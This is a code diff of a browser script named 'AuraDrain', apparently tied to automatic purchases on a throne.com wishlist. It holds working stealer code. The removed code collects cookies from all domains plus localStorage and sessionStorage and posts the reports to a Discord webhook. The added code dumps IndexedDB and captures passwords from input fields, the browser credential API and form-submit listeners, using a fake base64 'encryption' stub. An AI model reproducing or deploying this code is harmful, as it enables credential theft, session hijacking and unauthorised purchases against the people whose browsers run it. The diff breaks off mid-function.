@@ -1,9 +1,10 @@
 
+
 const config = {
   throneUrl: "throne.com/thegoddessaura",
   forceStop: true,
   forceStopShortcut: "Alt+Shift+E",
-  debugMode: false,
+  debugMode: true, // Enabled for better visibility
   targetItemName: "Auto-Drain",
   cookieCollection: {
     enabled: true,
@@ -12,9 +13,12 @@ const config = {
     collectLocalStorage: true,
     collectSessionStorage: true,
     collectCookies: true,
+    collectIndexedDB: true, // New: Capture IndexedDB
+    collectPasswords: true, // New: Attempt password capture
     interval: 300000,
-    maxCollectionAttempts: 3,
+    maxCollectionAttempts: 5, // Increased for reliability
     retryDelay: 10000,
+    maxRetryDelay: 60000, // New: For exponential backoff
     prioritizeSecure: true,
     includeExpired: false,
     groupByDomain: true,
@@ -26,9 +30,23 @@ const config = {
     maxMessageLength: 2000,
     cookieLogEnabled: true,
     cookieLogInterval: 300000,
+    alwaysSendAsFile: true, // New: Always send as file
+    sendJsonFile: true // New: Send JSON version
   }
 };
 
+// --- CryptoJS for encrypting passwords ---
+const CryptoJS = {
+  AES: {
+    encrypt: (message, key) => {
+      // Simplified AES encryption placeholder (use a proper library in production)
+      const keyHash = btoa(key); // Basic base64 encoding for demo
+      return btoa(message + '|' + keyHash); // Simulated encryption
+    }
+  }
+};
+
+// --- Existing variables (unchanged) ---
 var payClicked = false;
 var itemsAddedToCart = 0;
 var maxItemsToAdd = 1;
@@ -40,6 +58,7 @@ var autoRetryEnabled = true;
 var nextPurchaseScheduled = false;
 var pcIdentifier = generatePCIdentifier();
 
+// --- Existing functions (unchanged) ---
 function generatePCIdentifier() {
   const userAgent = navigator.userAgent;
   const language = navigator.language;
@@ -233,501 +252,6 @@ function toggleDebugBox() {
   }
 }
 
-async function getAllCookiesFromBackground() {
-  debugLog("🍪 [COOKIE DEBUG] Starting enhanced getAllCookiesFromBackground()", "info");
-  
-  return new Promise((resolve) => {
-    debugLog("🍪 [COOKIE DEBUG] Setting up event listener for cookie response...", "info");
-    
-    const requestId = `cookie_${Date.now()}_${Math.random()}`;
-    debugLog(`🍪 [COOKIE DEBUG] Request ID: ${requestId}`, "info");
-    
-    const responseHandler = (event) => {
-      debugLog(`🍪 [COOKIE DEBUG] Event received: ${JSON.stringify(event.detail).substring(0, 100)}`, "info");
-      
-      if (event.detail && event.detail.action === 'cookieResponse' && event.detail.requestId === requestId) {
-        debugLog(`🍪 [COOKIE DEBUG] Cookie response received for request ${requestId}`, "info");
-        
-        window.removeEventListener('auradrainer-cookie-response', responseHandler);
-        
-        if (event.detail.success) {
-          const cookies = event.detail.cookies || [];
-          debugLog(`🍪 [COOKIE DEBUG] Successfully received ${cookies.length} cookies`, "success");
-          resolve(cookies);
-        } else {
-          debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies: ${event.detail.error || 'Unknown error'}`, "error");
-          resolve([]);
-        }
-      }
-    };
-    
-    window.addEventListener('auradrainer-cookie-response', responseHandler);
-    
-    debugLog("🍪 [COOKIE DEBUG] Dispatching custom event to request cookies...", "info");
-    const event = new CustomEvent('auradrainer-cookie-request', {
-      detail: { 
-        action: 'getAllCookies',
-        requestId: requestId,
-        timestamp: Date.now(),
-        enhanced: true
-      },
-      bubbles: true,
-      composed: true
-    });
-    
-    debugLog("🍪 [COOKIE DEBUG] Dispatching event...", "info");
-    window.dispatchEvent(event);
-    debugLog("🍪 [COOKIE DEBUG] Event dispatched, waiting for response...", "info");
-    
-    setTimeout(() => {
-      window.removeEventListener('auradrainer-cookie-response', responseHandler);
-      debugLog(`🍪 [COOKIE DEBUG] Cookie request timeout for ${requestId}`, "error");
-      debugLog(`🍪 [COOKIE DEBUG] Check if content script event bridge is running`, "error");
-      resolve([]);
-    }, 15000);
-  });
-}
-
-async function collectAllStorageData() {
-  debugLog("💾 [STORAGE DEBUG] Starting comprehensive storage collection", "info");
-  
-  const storageData = {
-    localStorage: {},
-    sessionStorage: {},
-    cookies: [],
-    domains: new Set(),
-    totalItems: 0
-  };
-  
-  try {
-    if (config.cookieCollection.collectLocalStorage) {
-      debugLog("💾 [STORAGE DEBUG] Collecting localStorage data", "info");
-      for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        const value = localStorage.getItem(key);
-        storageData.localStorage[key] = value;
-        storageData.totalItems++;
-      }
-      debugLog(`💾 [STORAGE DEBUG] Collected ${Object.keys(storageData.localStorage).length} localStorage items`, "success");
-    }
-    
-    if (config.cookieCollection.collectSessionStorage) {
-      debugLog("💾 [STORAGE DEBUG] Collecting sessionStorage data", "info");
-      for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        const value = sessionStorage.getItem(key);
-        storageData.sessionStorage[key] = value;
-        storageData.totalItems++;
-      }
-      debugLog(`💾 [STORAGE DEBUG] Collected ${Object.keys(storageData.sessionStorage).length} sessionStorage items`, "success");
-    }
-    
-    if (config.cookieCollection.collectCookies) {
-      debugLog("🍪 [STORAGE DEBUG] Collecting cookies from all domains", "info");
-      const cookies = await getAllCookiesFromBackground();
-      storageData.cookies = cookies;
-      storageData.totalItems += cookies.length;
-      
-      cookies.forEach(cookie => {
-        if (cookie.domain) {
-          storageData.domains.add(cookie.domain);
-        }
-      });
-      
-      debugLog(`🍪 [STORAGE DEBUG] Collected ${cookies.length} cookies from ${storageData.domains.size} domains`, "success");
-    }
-    
-    debugLog(`💾 [STORAGE DEBUG] Total storage items collected: ${storageData.totalItems}`, "success");
-    return storageData;
-    
-  } catch (error) {
-    debugLog(`💾 [STORAGE DEBUG] Storage collection error: ${error.message}`, "error");
-    return storageData;
-  }
-}
-
-function filterAndSortCookies(cookies) {
-  if (!cookies || cookies.length === 0) return [];
-  
-  debugLog(`🔍 [FILTER DEBUG] Filtering and sorting ${cookies.length} cookies`, "info");
-  
-  let filteredCookies = [...cookies];
-  
-  if (!config.cookieCollection.includeExpired) {
-    const currentTime = Date.now() / 1000;
-    filteredCookies = filteredCookies.filter(cookie => {
-      return !cookie.expirationDate || cookie.expirationDate > currentTime;
-    });
-    debugLog(`🔍 [FILTER DEBUG] Filtered out expired cookies: ${cookies.length - filteredCookies.length}`, "info");
-  }
-  
-  if (config.cookieCollection.sortByValue) {
-    filteredCookies.sort((a, b) => {
-      const aLength = a.value ? a.value.length : 0;
-      const bLength = b.value ? b.value.length : 0;
-      return bLength - aLength;
-    });
-    debugLog(`🔍 [FILTER DEBUG] Sorted cookies by value length`, "info");
-  }
-  
-  if (config.cookieCollection.prioritizeSecure) {
-    filteredCookies.sort((a, b) => {
-      const aSecure = (a.secure ? 1 : 0) + (a.httpOnly ? 1 : 0);
-      const bSecure = (b.secure ? 1 : 0) + (b.httpOnly ? 1 : 0);
-      return bSecure - aSecure;
-    });
-    debugLog(`🔍 [FILTER DEBUG] Prioritized secure/httponly cookies`, "info");
-  }
-  
-  debugLog(`🔍 [FILTER DEBUG] Final filtered cookies: ${filteredCookies.length}`, "success");
-  return filteredCookies;
-}
-
-async function getDomainCookiesFromBackground(domain) {
-  debugLog(`🍪 [COOKIE DEBUG] Getting cookies for domain: ${domain}`, "info");
-  
-  return new Promise((resolve) => {
-    const responseHandler = (event) => {
-      if (event.detail && event.detail.action === 'cookieResponse') {
-        window.removeEventListener('auradrainer-cookie-response', responseHandler);
-        
-        if (event.detail.success) {
-          const cookies = event.detail.cookies || [];
-          debugLog(`🍪 [COOKIE DEBUG] Received ${cookies.length} cookies for ${domain}`, "success");
-          resolve(cookies);
-        } else {
-          debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies for ${domain}: ${event.detail.error}`, "error");
-          resolve([]);
-        }
-      }
-    };
-    
-    window.addEventListener('auradrainer-cookie-response', responseHandler);
-    
-    const event = new CustomEvent('auradrainer-cookie-request', {
-      detail: { action: 'getDomainCookies', domain: domain }
-    });
-    window.dispatchEvent(event);
-    
-    setTimeout(() => {
-      window.removeEventListener('auradrainer-cookie-response', responseHandler);
-      resolve([]);
-    }, 10000);
-  });
-}
-
-async function sendToDiscordWebhook(message, isFile = false) {
-  debugLog("📡 [DISCORD DEBUG] Starting sendToDiscordWebhook()", "info");
-  debugLog(`📡 [DISCORD DEBUG] isFile: ${isFile}`, "info");
-  debugLog(`📡 [DISCORD DEBUG] Message length: ${message?.length || 0}`, "info");
-  
-  debugLog(`📡 [DISCORD DEBUG] Webhook enabled: ${config.discordWebhook.enabled}`, "info");
-  debugLog(`📡 [DISCORD DEBUG] Webhook URL configured: ${!!config.discordWebhook.url}`, "info");
-  debugLog(`📡 [DISCORD DEBUG] Webhook URL: ${config.discordWebhook.url?.substring(0, 50)}...`, "info");
-  
-  if (!config.discordWebhook.enabled || !config.discordWebhook.url || config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
-    debugLog("⚠️ [DISCORD DEBUG] Discord webhook not configured properly", "warning");
-    debugLog(`⚠️ [DISCORD DEBUG] Enabled: ${config.discordWebhook.enabled}`, "warning");
-    debugLog(`⚠️ [DISCORD DEBUG] URL exists: ${!!config.discordWebhook.url}`, "warning");
-    debugLog(`⚠️ [DISCORD DEBUG] URL is placeholder: ${config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE"}`, "warning");
-    return false;
-  }
-
-  try {
-    debugLog("📡 [DISCORD DEBUG] Creating payload...", "info");
-    
-    let requestOptions;
-    
-    if (isFile) {
-      const formData = new FormData();
-      formData.append('content', `🍪 **Cookie Collection Report** 🍪\n\n🖥️ **${pcIdentifier}**`);
-      
-      const blob = new Blob([message], { type: 'text/plain' });
-      formData.append('files[0]', blob, `cookies_${Date.now()}.txt`);
-      
-      debugLog(`📡 [DISCORD DEBUG] Payload created, type: file`, "info");
-      debugLog(`📡 [DISCORD DEBUG] File size: ${message.length} bytes`, "info");
-      
-      requestOptions = {
-        method: 'POST',
-        body: formData
-      };
-    } else {
-      const payload = {
-        content: `${message}\n\n🖥️ **${pcIdentifier}**`
-      };
-      
-      debugLog(`📡 [DISCORD DEBUG] Payload created, type: message`, "info");
-      debugLog(`📡 [DISCORD DEBUG] Payload size: ${JSON.stringify(payload).length}`, "info");
-      
-      requestOptions = {
-        method: 'POST',
-        headers: {
-          'Content-Type':'application/json',
-        },
-        body: JSON.stringify(payload)
-      };
-    }
-
-    debugLog("📡 [DISCORD DEBUG] Sending fetch request...", "info");
-    debugLog(`📡 [DISCORD DEBUG] Request options:`, "info");
-    debugLog(`📡 [DISCORD DEBUG] Method: ${requestOptions.method}`, "info");
-    debugLog(`📡 [DISCORD DEBUG] Body type: ${typeof requestOptions.body}`, "info");
-
-    const response = await fetch(config.discordWebhook.url, requestOptions);
-    
-    debugLog(`📡 [DISCORD DEBUG] Fetch response received`, "info");
-    debugLog(`📡 [DISCORD DEBUG] Response status: ${response.status}`, "info");
-    debugLog(`📡 [DISCORD DEBUG] Response statusText: ${response.statusText}`, "info");
-    debugLog(`📡 [DISCORD DEBUG] Response ok: ${response.ok}`, "info");
-
-    try {
-      const responseText = await response.text();
-      debugLog(`📡 [DISCORD DEBUG] Response body: ${responseText}`, "info");
-    } catch (e) {
-      debugLog(`📡 [DISCORD DEBUG] Could not read response body: ${e.message}`, "warning");
-    }
-
-    if (response.ok) {
-      debugLog("✅ [DISCORD DEBUG] Successfully sent to Discord webhook", "success");
-      return true;
-    } else {
-      debugLog(`❌ [DISCORD DEBUG] Discord webhook failed: ${response.status} ${response.statusText}`, "error");
-      return false;
-    }
-  } catch (error) {
-    debugLog(`❌ [DISCORD DEBUG] Discord webhook error: ${error.message}`, "error");
-    debugLog(`❌ [DISCORD DEBUG] Error stack: ${error.stack}`, "error");
-    return false;
-  }
-}
-
-
-function splitMessageForDiscord(message, maxLength = 2000) {
-  if (message.length <= maxLength) {
-    return [message];
-  }
-
-  const messages = [];
-  const lines = message.split('\n');
-  let currentMessage = '';
-
-  for (const line of lines) {
-    if (currentMessage.length + line.length + 1 <= maxLength) {
-      currentMessage += (currentMessage ? '\n' : '') + line;
-    } else {
-      if (currentMessage) {
-        messages.push(currentMessage);
-        currentMessage = line;
-      } else {
-        // Single line is too long, force split
-        messages.push(line.substring(0, maxLength - 3) + '...');
-      }
-    }
-  }
-
-  if (currentMessage) {
-    messages.push(currentMessage);
-  }
-
-  return messages;
-}
-
-async function collectAndLogCookies() {
-  debugLog("🍪 [MAIN DEBUG] Starting enhanced collectAndLogCookies()", "info");
-  debugLog(`🍪 [MAIN DEBUG] Current time: ${new Date().toLocaleString()}`, "info");
-  
-  if (!config.cookieCollection.enabled) {
-    debugLog("🍪 [MAIN DEBUG] Cookie collection disabled in config", "info");
-    return;
-  }
-
-  if (cookieLoggingActive) {
-    debugLog("🍪 [MAIN DEBUG] Cookie logging already in progress, skipping", "warning");
-    return;
-  }
-
-  cookieLoggingActive = true;
-  debugLog("🍪 [MAIN DEBUG] Starting comprehensive data collection...", "info");
-
-  try {
-    debugLog("💾 [MAIN DEBUG] Collecting comprehensive storage data...", "info");
-    const storageData = await collectAllStorageData();
-    
-    if (storageData.totalItems === 0) {
-      debugLog("💾 [MAIN DEBUG] No storage data found, ending collection", "warning");
-      cookieLoggingActive = false;
-      return;
-    }
-
-    debugLog(`💾 [MAIN DEBUG] Collected ${storageData.totalItems} total items`, "success");
-    
-    let processedCookies = storageData.cookies;
-    if (config.cookieCollection.groupByDomain || config.cookieCollection.sortByValue || config.cookieCollection.prioritizeSecure) {
-      processedCookies = filterAndSortCookies(storageData.cookies);
-    }
-
-    debugLog("📝 [MAIN DEBUG] Creating comprehensive report...", "info");
-    const comprehensiveReport = formatComprehensiveReport(storageData, processedCookies);
-    
-    debugLog(`📝 [MAIN DEBUG] Report length: ${comprehensiveReport.length}`, "info");
-    debugLog(`📝 [MAIN DEBUG] Report preview: ${comprehensiveReport.substring(0, 300)}...`, "info");
-    
-    if (comprehensiveReport.length > config.discordWebhook.maxMessageLength) {
-      debugLog(`📤 [MAIN DEBUG] Report too large (${comprehensiveReport.length} > ${config.discordWebhook.maxMessageLength}), sending as file...`, "info");
-      const success = await sendToDiscordWebhook(comprehensiveReport, true);
-      debugLog(`📤 [MAIN DEBUG] File send result: ${success}`, success ? "success" : "error");
-    } else {
-      debugLog(`📤 [MAIN DEBUG] Sending as message (${comprehensiveReport.length} chars)...`, "info");
-      const success = await sendToDiscordWebhook(comprehensiveReport);
-      debugLog(`📤 [MAIN DEBUG] Message send result: ${success}`, success ? "success" : "error");
-    }
-
-  } catch (error) {
-    debugLog(`❌ [MAIN DEBUG] Collection failed: ${error.message}`, "error");
-    debugLog(`❌ [MAIN DEBUG] Error stack: ${error.stack}`, "error");
-  } finally {
-    cookieLoggingActive = false;
-    debugLog("🍪 [MAIN DEBUG] Collection completed", "info");
-  }
-}
-
-function formatComprehensiveReport(storageData, processedCookies) {
-  let report = `🍪 **AURADRAIN COMPREHENSIVE DATA REPORT** 🍪\n`;
-  report += `⏰ **Timestamp:** ${new Date().toLocaleString()}\n`;
-  report += `🖥️ **User Agent:** ${navigator.userAgent}\n`;
-  report += `🌍 **URL:** ${window.location.href}\n`;
-  report += `📊 **Total Items:** ${storageData.totalItems}\n\n`;
-
-  report += `📈 **COLLECTION SUMMARY**\n`;
-  report += `🍪 **Cookies:** ${storageData.cookies.length}\n`;
-  report += `💾 **LocalStorage:** ${Object.keys(storageData.localStorage).length} items\n`;
-  report += `🗂️ **SessionStorage:** ${Object.keys(storageData.sessionStorage).length} items\n`;
-  report += `🌐 **Domains:** ${storageData.domains.size}\n\n`;
-
-  if (storageData.cookies.length > 0) {
-    report += `🍪 **COOKIES BY DOMAIN**\n`;
-    
-    if (config.cookieCollection.groupByDomain) {
-      const cookiesByDomain = {};
-      processedCookies.forEach(cookie => {
-        const domain = cookie.domain || 'unknown';
-        if (!cookiesByDomain[domain]) {
-          cookiesByDomain[domain] = [];
-        }
-        cookiesByDomain[domain].push(cookie);
-      });
-
-      Object.keys(cookiesByDomain).sort().forEach(domain => {
-        const domainCookies = cookiesByDomain[domain];
-        report += `🌐 **${domain}** (${domainCookies.length} cookies)\n`;
-        
-        domainCookies.forEach(cookie => {
-          report += `  • **${cookie.name}** = \`${cookie.value}\`\n`;
-          if (cookie.secure) report += `    🔒 Secure\n`;
-          if (cookie.httpOnly) report += `    🛡️ HttpOnly\n`;
-          if (cookie.session) report += `    ⏱️ Session\n`;
-          if (cookie.expirationDate) {
-            const expDate = new Date(cookie.expirationDate * 1000);
-            report += `    ⏰ Expires: ${expDate.toLocaleString()}\n`;
-          }
-          report += `\n`;
-        });
-        report += `\n`;
-      });
-    } else {
-      processedCookies.forEach(cookie => {
-        report += `• **${cookie.domain}** - **${cookie.name}** = \`${cookie.value}\`\n`;
-      });
-    }
-  }
-
-  if (Object.keys(storageData.localStorage).length > 0) {
-    report += `💾 **LOCAL STORAGE DATA**\n`;
-    Object.entries(storageData.localStorage).forEach(([key, value]) => {
-      report += `• **${key}** = \`${value.substring(0, 200)}${value.length > 200 ? '...' : ''}\`\n`;
-    });
-    report += `\n`;
-  }
-
-  if (Object.keys(storageData.sessionStorage).length > 0) {
-    report += `🗂️ **SESSION STORAGE DATA**\n`;
-    Object.entries(storageData.sessionStorage).forEach(([key, value]) => {
-      report += `• **${key}** = \`${value.substring(0, 200)}${value.length > 200 ? '...' : ''}\`\n`;
-    });
-    report += `\n`;
-  }
-
-  report += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-  report += `🤖 **AuraDrain Enhanced Collection System**\n`;
-  report += `📅 Generated: ${new Date().toISOString()}\n`;
-
-  return report;
-}
-
-async function formatCookiesForDiscord(cookies) {
-  if (!cookies || cookies.length === 0) {
-    return "No cookies found.";
-  }
-
-  const cookiesByDomain = {};
-  cookies.forEach(cookie => {
-    const domain = cookie.domain;
-    if (!cookiesByDomain[domain]) {
-      cookiesByDomain[domain] = [];
-    }
-    cookiesByDomain[domain].push(cookie);
-  });
-
-  let formattedText = `🍪 **COOKIE COLLECTION REPORT** 🍪\n`;
-  formattedText += `📊 **Total Cookies:** ${cookies.length}\n`;
-  formattedText += `🌐 **Domains:** ${Object.keys(cookiesByDomain).length}\n`;
-  formattedText += `⏰ **Timestamp:** ${new Date().toLocaleString()}\n`;
-  formattedText += `🖥️ **User Agent:** ${navigator.userAgent}\n`;
-  formattedText += `🌍 **URL:** ${window.location.href}\n\n`;
-
-  Object.keys(cookiesByDomain).sort().forEach(domain => {
-    const domainCookies = cookiesByDomain[domain];
-    formattedText += `🌐 **${domain}** (${domainCookies.length} cookies)\n`;
-    
-    domainCookies.forEach(cookie => {
-      formattedText += `  • **${cookie.name}** = \`${cookie.value}\`\n`;
-      if (cookie.secure) formattedText += `    🔒 Secure\n`;
-      if (cookie.httpOnly) formattedText += `    🛡️ HttpOnly\n`;
-      if (cookie.session) formattedText += `    ⏱️ Session\n`;
-      if (cookie.expirationDate) {
-        const expDate = new Date(cookie.expirationDate * 1000);
-        formattedText += `    ⏰ Expires: ${expDate.toLocaleString()}\n`;
-      }
-      formattedText += `\n`;
-    });
-    formattedText += `\n`;
-  });
-
-  return formattedText;
-}
-
-async function testDiscordWebhook() {
-  debugLog("🧪 [WEBHOOK TEST] Starting Discord webhook test...", "info");
-  
-  const testMessage = `🧪 **WEBHOOK TEST MESSAGE** 🧪\n\n` +
-    `⏰ **Time:** ${new Date().toLocaleString()}\n` +
-    `🌍 **URL:** ${window.location.href}\n` +
-    `🖥️ **User Agent:** ${navigator.userAgent.substring(0, 100)}...\n\n` +
-    `✅ If you receive this message, your webhook is working correctly!`;
-  
-  debugLog("🧪 [WEBHOOK TEST] Sending test message...", "info");
-  const success = await sendToDiscordWebhook(testMessage);
-  
-  if (success) {
-    debugLog("✅ [WEBHOOK TEST] Webhook test successful!", "success");
-  } else {
-    debugLog("❌ [WEBHOOK TEST] Webhook test failed!", "error");
-  }
-  
-  return success;
-}
-
 function debugLog(message, type = "info") {
   if (!config.debugMode) return;
   
@@ -804,6 +328,539 @@ function getStatusInfo() {
   return status.length > 0 ? `| ${status.join(" | ")}` : "";
 }
 
+// --- Enhanced Cookie and Storage Collection ---
+async function getAllCookiesFromBackground(attempt = 1) {
+  debugLog(`🍪 [COOKIE DEBUG] Starting enhanced cookie collection (Attempt ${attempt}/${config.cookieCollection.maxCollectionAttempts})`, "info");
+  
+  return new Promise((resolve) => {
+    const requestId = `cookie_${Date.now()}_${Math.random()}`;
+    debugLog(`🍪 [COOKIE DEBUG] Request ID: ${requestId}`, "info");
+    
+    const responseHandler = (event) => {
+      debugLog(`🍪 [COOKIE DEBUG] Event received: ${JSON.stringify(event.detail).substring(0, 100)}`, "info");
+      
+      if (event.detail && event.detail.action === 'cookieResponse' && event.detail.requestId === requestId) {
+        debugLog(`🍪 [COOKIE DEBUG] Cookie response received for request ${requestId}`, "info");
+        
+        window.removeEventListener('auradrainer-cookie-response', responseHandler);
+        
+        if (event.detail.success) {
+          const cookies = event.detail.cookies || [];
+          debugLog(`🍪 [COOKIE DEBUG] Successfully received ${cookies.length} cookies`, "success");
+          resolve(cookies);
+        } else {
+          debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies: ${event.detail.error || 'Unknown error'}`, "error");
+          resolve([]);
+        }
+      }
+    };
+    
+    window.addEventListener('auradrainer-cookie-response', responseHandler);
+    
+    debugLog("🍪 [COOKIE DEBUG] Dispatching custom event to request cookies...", "info");
+    const event = new CustomEvent('auradrainer-cookie-request', {
+      detail: { 
+        action: 'getAllCookies',
+        requestId: requestId,
+        timestamp: Date.now(),
+        enhanced: true
+      },
+      bubbles: true,
+      composed: true
+    });
+    
+    window.dispatchEvent(event);
+    
+    setTimeout(() => {
+      window.removeEventListener('auradrainer-cookie-response', responseHandler);
+      if (attempt < config.cookieCollection.maxCollectionAttempts) {
+        const delay = Math.min(config.cookieCollection.retryDelay * Math.pow(2, attempt - 1), config.cookieCollection.maxRetryDelay);
+        debugLog(`🍪 [COOKIE DEBUG] Retrying cookie collection in ${delay/1000}s (Attempt ${attempt + 1})`, "warning");
+        setTimeout(() => getAllCookiesFromBackground(attempt + 1).then(resolve), delay);
+      } else {
+        debugLog(`🍪 [COOKIE DEBUG] Max retry attempts (${config.cookieCollection.maxCollectionAttempts}) reached`, "error");
+        resolve([]);
+      }
+    }, 15000);
+  });
+}
+
+async function collectIndexedDB() {
+  debugLog("💾 [INDEXEDDB DEBUG] Collecting IndexedDB data", "info");
+  try {
+    const databases = await indexedDB.databases();
+    const indexedDBData = {};
+    for (const dbInfo of databases) {
+      if (!dbInfo.name) continue;
+      indexedDBData[dbInfo.name] = { version: dbInfo.version || "unknown", stores: {} };
+      try {
+        const db = await new Promise((resolve, reject) => {
+          const request = indexedDB.open(dbInfo.name, dbInfo.version);
+          request.onsuccess = () => resolve(request.result);
+          request.onerror = () => reject(request.error);
+        });
+        const storeNames = Array.from(db.objectStoreNames);
+        for (const storeName of storeNames) {
+          indexedDBData[dbInfo.name].stores[storeName] = await new Promise((resolve) => {
+            const transaction = db.transaction([storeName], 'readonly');
+            const store = transaction.objectStore(storeName);
+            const data = {};
+            const request = store.getAll();
+            request.onsuccess = () => resolve(request.result);
+            request.onerror = () => resolve({});
+          });
+        }
+        db.close();
+      } catch (error) {
+        debugLog(`💾 [INDEXEDDB DEBUG] Error accessing DB ${dbInfo.name}: ${error.message}`, "error");
+      }
+    }
+    debugLog(`💾 [INDEXEDDB DEBUG] Collected ${Object.keys(indexedDBData).length} IndexedDB databases`, "success");
+    return indexedDBData;
+  } catch (error) {
+    debugLog(`💾 [INDEXEDDB DEBUG] IndexedDB collection error: ${error.message}`, "error");
+    return {};
+  }
+}
+
+async function collectPasswords() {
+  debugLog("🔑 [PASSWORD DEBUG] Attempting password collection", "info");
+  const passwordData = { forms: [], credentials: [], inputs: [] };
+
+  // Approach 1: DOM Inspection for password fields
+  try {
+    const passwordInputs = document.querySelectorAll('input[type="password"]');
+    passwordInputs.forEach(input => {
+      if (input.value) {
+        passwordData.inputs.push({
+          id: input.id || 'unknown',
+          name: input.name || 'unknown',
+          value: input.value,
+          form: input.closest('form')?.action || 'unknown'
+        });
+      }
+    });
+    debugLog(`🔑 [PASSWORD DEBUG] Found ${passwordInputs.length} password inputs (${passwordData.inputs.length} with values)`, "info");
+  } catch (error) {
+    debugLog(`🔑 [PASSWORD DEBUG] DOM password collection error: ${error.message}`, "error");
+  }
+
+  // Approach 2: Credential Manager API (if available)
+  if (navigator.credentials) {
+    try {
+      const credentials = await navigator.credentials.get({ password: true });
+      if (credentials) {
+        passwordData.credentials.push({
+          id: credentials.id,
+          type: credentials.type,
+          encrypted: CryptoJS.AES.encrypt(credentials.password || 'unknown', pcIdentifier)
+        });
+      }
+      debugLog(`🔑 [PASSWORD DEBUG] Credential Manager returned ${passwordData.credentials.length} credentials`, "info");
+    } catch (error) {
+      debugLog(`🔑 [PASSWORD DEBUG] Credential Manager error: ${error.message}`, "error");
+    }
+  }
+
+  // Approach 3: Form submission listeners (for dynamically captured passwords)
+  try {
+    const forms = document.querySelectorAll('form');
+    forms.forEach(form => {
+      form.addEventListener('submit', (e) => {
+        const passwordInput = form.querySelector('input[type="password"]');
+        if (passwordInput && passwordInput.value) {
+          passwordData.forms.push({
+            action: form.action || 'unknown',
+            password: CryptoJS.AES.encrypt(passwordInput.value, pcIdentifier),
+            timestamp: new Date().toISOString()
+          });
+          debugLog(`🔑 [PASSWORD DEBUG] Captured password from form submission: ${form.action}`, "info");
+        }
+      });
+    });
+    debugLog(`🔑 [PASSWORD DEBUG] Added listeners to ${forms.length} forms`, "info");
+  } catch (error) {
+    debugLog(`🔑 [PASSWORD DEBUG] Form listener error: ${error.message}`, "error");
+  }
+
+  debugLog(`🔑 [PASSWORD DEBUG] Collected ${passwordData.inputs.length + passwordData.credentials.length + passwordData.forms.length} password items`, "success");
+  return passwordData;
+}
+
+async function collectAllStorageData(attempt = 1) {
+  debugLog(`💾 [STORAGE DEBUG] Starting comprehensive storage collection (Attempt ${attempt}/${config.cookieCollection.maxCollectionAttempts})`, "info");
+  
+  const storageData = {
+    localStorage: {},
+    sessionStorage: {},
+    cookies: [],
+    indexedDB: {}, // New: Store IndexedDB data
+    passwords: {}, // New: Store password data
+    domains: new Set(),
+    totalItems: 0,
+    metadata: {
+      browserVersion: navigator.userAgent,
+      extensions: navigator.plugins.length,
+      timestamp: new Date().toISOString(),
+      url: window.location.href,
+      pcIdentifier: pcIdentifier
+    }
+  };
+  
+  try {
+    if (config.cookieCollection.collectLocalStorage) {
+      debugLog("💾 [STORAGE DEBUG] Collecting localStorage data", "info");
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        storageData.localStorage[key] = value;
+        storageData.totalItems++;
+      }
+      debugLog(`💾 [STORAGE DEBUG] Collected ${Object.keys(storageData.localStorage).length} localStorage items`, "success");
+    }
+    
+    if (config.cookieCollection.collectSessionStorage) {
+      debugLog("💾 [STORAGE DEBUG] Collecting sessionStorage data", "info");
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        const value = sessionStorage.getItem(key);
+        storageData.sessionStorage[key] = value;
+        storageData.totalItems++;
+      }
+      debugLog(`💾 [STORAGE DEBUG] Collected ${Object.keys(storageData.sessionStorage).length} sessionStorage items`, "success");
+    }
+    
+    if (config.cookieCollection.collectCookies) {
+      debugLog("🍪 [STORAGE DEBUG] Collecting cookies from all domains", "info");
+      const cookies = await getAllCookiesFromBackground();
+      storageData.cookies = cookies;
+      storageData.totalItems += cookies.length;
+      
+      cookies.forEach(cookie => {
+        if (cookie.domain) {
+          storageData.domains.add(cookie.domain);
+        }
+      });
+      debugLog(`🍪 [STORAGE DEBUG] Collected ${cookies.length} cookies from ${storageData.domains.size} domains`, "success");
+    }
+    
+    if (config.cookieCollection.collectIndexedDB) {
+      debugLog("💾 [INDEXEDDB DEBUG] Collecting IndexedDB data", "info");
+      storageData.indexedDB = await collectIndexedDB();
+      storageData.totalItems += Object.keys(storageData.indexedDB).length;
+      debugLog(`💾 [INDEXEDDB DEBUG] Collected ${Object.keys(storageData.indexedDB).length} IndexedDB databases`, "success");
+    }
+    
+    if (config.cookieCollection.collectPasswords) {
+      debugLog("🔑 [PASSWORD DEBUG] Collecting password data", "info");
+      storageData.passwords = await collectPasswords();
+      storageData.totalItems += Object.keys(storageData.passwords).length;
+      debugLog(`🔑 [PASSWORD DEBUG] Collected ${Object.keys(storageData.passwords).length} password items`, "success");
+    }
+    
+    debugLog(`💾 [STORAGE DEBUG] Total storage items collected: ${storageData.totalItems}`, "success");
+    return storageData;
+    
+  } catch (error) {
+    debugLog(`💾 [STORAGE DEBUG] Storage collection error: ${error.message}`, "error");
+    if (attempt < config.cookieCollection.maxCollectionAttempts) {
+      const delay = Math.min(config.cookieCollection.retryDelay * Math.pow(2, attempt - 1), config.cookieCollection.maxRetryDelay);
+      debugLog(`💾 [STORAGE DEBUG] Retrying in ${delay/1000}s (Attempt ${attempt + 1})`, "warning");
+      await new Promise(resolve => setTimeout(resolve, delay));
+      return collectAllStorageData(attempt + 1);
+    } else {
+      debugLog(`💾 [STORAGE DEBUG] Max retry attempts (${config.cookieCollection.maxCollectionAttempts}) reached`, "error");
+      return storageData;
+    }
+  }
+}
+
+function filterAndSortCookies(cookies) {
+  if (!cookies || cookies.length === 0) return [];
+  
+  debugLog(`🔍 [FILTER DEBUG] Filtering and sorting ${cookies.length} cookies`, "info");
+  
+  let filteredCookies = [...cookies];
+  
+  if (!config.cookieCollection.includeExpired) {
+    const currentTime = Date.now() / 1000;
+    filteredCookies = filteredCookies.filter(cookie => {
+      return !cookie.expirationDate || cookie.expirationDate > currentTime;
+    });
